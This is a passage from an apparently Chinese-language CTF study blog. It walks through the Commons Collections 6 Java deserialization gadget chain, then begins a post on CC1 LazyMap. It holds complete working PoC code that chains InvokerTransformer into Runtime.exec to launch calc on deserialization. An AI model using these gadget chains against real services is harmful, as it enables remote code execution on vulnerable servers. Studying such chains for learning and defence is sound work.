java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        poc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. payload * * * * * */</span></span><br><span class="line">            <span class="comment">// 依照思路是要给lazymap的转换器的</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    , <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 构造lazyMap * * * * * */</span></span><br><span class="line">            <span class="comment">// 先不加transformer，后面反射再加，防止提前触发，这里是占位</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">myLazyMap</span> <span class="operator">=</span> LazyMap.decorate(myMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;placeholder&quot;</span>));</span><br><span class="line">            myLazyMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>); <span class="comment">// 这里无事发生，不会调用转换器，transformedMap才会在put调用</span></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(myLazyMap, <span class="string">&quot;key1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 构造反序列化对象HashMap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">deserMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            deserMap.put(triggerObj,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">                <span class="comment">// 就是这里的put调用了key的hashCode()方法先进行了一次添加，添加到了最底层的myMap中</span></span><br><span class="line">                <span class="comment">// 调用了lazyMap中的transform方法</span></span><br><span class="line">                <span class="comment">// 这里还要注意需要放在key这里，因为lazyMap中transform是对key的</span></span><br><span class="line">            myLazyMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 反射加入payload * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(myLazyMap,payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. 模拟反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(deserMap);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Q-为什么payload最后再加入"><a href="#Q-为什么payload最后再加入" class="headerlink" title="Q: 为什么payload最后再加入?"></a>Q: 为什么payload最后再加入?</h4><ol><li><p>防止中途被调用的情况</p></li><li><p>p牛的处理方式</p><ol><li>对transformerChain的指向而不是直接LazyMap中的factory</li><li><em><strong>很妙的思想</strong></em>: 既然factory是final，那我可以不改变他的指向，而是<strong>改变他指向的指向</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br></pre></td></tr></table></figure></li><li><p>我的处理方式</p><ol><li>直接对属性进行设置，<em><strong>经过实验也是可以直接对<code>protected final</code>使用反射进行修改</strong></em></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectFinalTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String myName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReflectFinalTest</span><span class="params">()</span> &#123;</span><br><span class="line">        myName = <span class="string">&quot;KC1zs4&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ReflectFinalTest</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectFinalTest</span>();</span><br><span class="line">            System.out.println(obj.myName);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ReflectFinalTest.class;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;myName&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, <span class="string">&quot;I&#x27;m not KC1zs4&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(obj.myName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h4 id="Q-为什么会在field-set-myLazyMap-payload-也调用一次？总共调用两次？"><a href="#Q-为什么会在field-set-myLazyMap-payload-也调用一次？总共调用两次？" class="headerlink" title="Q: 为什么会在field.set(myLazyMap,payload)也调用一次？总共调用两次？"></a>Q: 为什么会在<code>field.set(myLazyMap,payload)</code>也调用一次？总共调用两次？</h4><ol><li>Debug<ol><li>debug的话就会触发，但是如果正常运行的话(把序列化和反序列化部分注释掉)则不会进行触发 –&gt; <strong>p牛的解决方法中也会有</strong></li><li>判断：应该是debug触发了某种触发的方式</li></ol></li></ol><h4 id="Q-为什么myLazyMap-remove-key1-否则反序列化无法调用？"><a href="#Q-为什么myLazyMap-remove-key1-否则反序列化无法调用？" class="headerlink" title="Q: 为什么myLazyMap.remove(&quot;key1&quot;);否则反序列化无法调用？"></a>Q: 为什么<code>myLazyMap.remove(&quot;key1&quot;);</code>否则反序列化无法调用？</h4><blockquote><p>本质上是保证<code>map.containsKey(key) == false</code></p></blockquote><ol><li><p>注意到在LazyMap中要调用<code>transform()</code>的条件</p><ol><li>需要之前没有包含这一个key，如果调用过一次get(key)后，会进行一次put进去LazyMap中，LazyMap的put没有利用点 –&gt; <strong>这里通过调试可以发现的</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>REASON</strong></p><ol><li>而在将tme放入hashMap中有一道工序是<code>put()</code>，在urldns中可知这里会先行对tme进行hashCode()，导致原本map中没有的key在还没序列化的put这一步就已经被放入LazyMap了</li><li>那么后面再反序列化调用HashMap的readObejct再到调用链这里就没有触发<code>map.containsKey(key) == false</code>这一个点</li></ol></li><li><p><strong>Solution</strong></p><ol><li>在put之后再把该(key, value)给remove掉<code>outerMap.remove(&quot;keykey&quot;)</code></li></ol></li></ol><h4 id="构造poc的一些注意点"><a href="#构造poc的一些注意点" class="headerlink" title="构造poc的一些注意点"></a>构造poc的一些注意点</h4><ol><li><em><strong>还是要万全的链出来再写比较好(边写边想也可，就是不要急)，总之就是链要全</strong></em>，写的时候有一些模糊导致被卡到了</li><li>不要被一环套一环给搞晕了，清除调用链就好<ol><li>最底层使用HashMap是没有影响的</li><li>本质上是通过Entry进行调用的，主要再Entry的链上进行</li></ol></li></ol><h3 id="CC6-poc-phith0n"><a href="#CC6-poc-phith0n" class="headerlink" title="CC6 poc phith0n"></a>CC6 poc phith0n</h3><ol><li>浅浅分析一下</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span></span><br><span class="line">                ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结一下-从CC1-TransformedMap到CC1-LazyMap再到CC6"><a href="#总结一下-从CC1-TransformedMap到CC1-LazyMap再到CC6" class="headerlink" title="总结一下: 从CC1_TransformedMap到CC1_LazyMap再到CC6"></a>总结一下: 从CC1_TransformedMap到CC1_LazyMap再到CC6</h2><blockquote><p>不止要理解原理，还要理解探索的过程，这样才可以自己探索嘛</p></blockquote><ol><li>在链中要有一个利用点</li><li>对于利用点的各个判断条件都需要进行满足</li><li>链的利用<strong>要对那些类比较熟悉</strong>，多看就好了，能一次就记住也是强(多总结)</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈12</li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md">信工所大佬</a> –&gt; 比较多基于cc5的</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(4)_CC1_LazyMap</title>
      <link href="/2024/11/17/Java%E5%AE%89%E5%85%A85(4)_CC1_LazyMap/"/>
      <url>/2024/11/17/Java%E5%AE%89%E5%85%A85(4)_CC1_LazyMap/</url>
      
        <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><blockquote><p>和Java安全5(3)中的一样的</p></blockquote><ol><li><p>JDK版本应该为8u71之前</p></li><li><p>使用maven搭建，commons-collections3.1</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li><li><p>换源使用新建setting.xml，加入<a href="https://developer.aliyun.com/mirror/?serviceType=&tag=&keyword=maven">阿里源</a></p></li><li><p>随后下载common-collections3.1的源码就ok，似乎本来是class文件来着</p></li></ol><h2 id="CC1-LazyMap前置知识"><a href="#CC1-LazyMap前置知识" class="headerlink" title="CC1_LazyMap前置知识"></a>CC1_LazyMap前置知识</h2><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><ol><li><p>idea中看一下源码</p><ol><li>宏观的理解就是用于自定义在获取没有的key时的行为，lazy是懒加载，只有在被get时才会进行transform</li><li><strong>装饰器</strong>！根据构造器中的super(map)可知传入和返回的那个对象中指向的map是同一个，会同时被修改，这里也指明了not copies –&gt; TransformedMap也是指向同一个map对象</li><li>实现了readObject()，writeObject()并且实现了Serialzable接口，本身支持进行序列化与反序列化</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decorates another &lt;code&gt;Map&lt;/code&gt; to create objects in the map on demand.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * When the &#123;<span class="doctag">@link</span> #get(Object)&#125; method is called with a key that does not</span></span><br><span class="line"><span class="comment"> * exist in the map, the factory is used to create the object. The created</span></span><br><span class="line"><span class="comment"> * object will be added to the map using the requested key.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * For instance:</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * Factory factory = new Factory() &#123;</span></span><br><span class="line"><span class="comment"> *     public Object create() &#123;</span></span><br><span class="line"><span class="comment"> *         return new Date();</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * Map lazy = Lazy.map(new HashMap(), factory);</span></span><br><span class="line"><span class="comment"> * Object obj = lazy.get(&quot;NOW&quot;);</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * After the above code is executed, &lt;code&gt;obj&lt;/code&gt; will contain</span></span><br><span class="line"><span class="comment"> * a new &lt;code&gt;Date&lt;/code&gt; instance. Furthermore, that &lt;code&gt;Date&lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * instance is mapped to the &quot;NOW&quot; key in the map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This class is Serializable from Commons Collections 3.1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.7 $ $Date: 2004/05/07 23:30:33 $</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Paul Jack</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serialization version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The factory to use to construct elements */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Factory method to create a lazily instantiated map.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    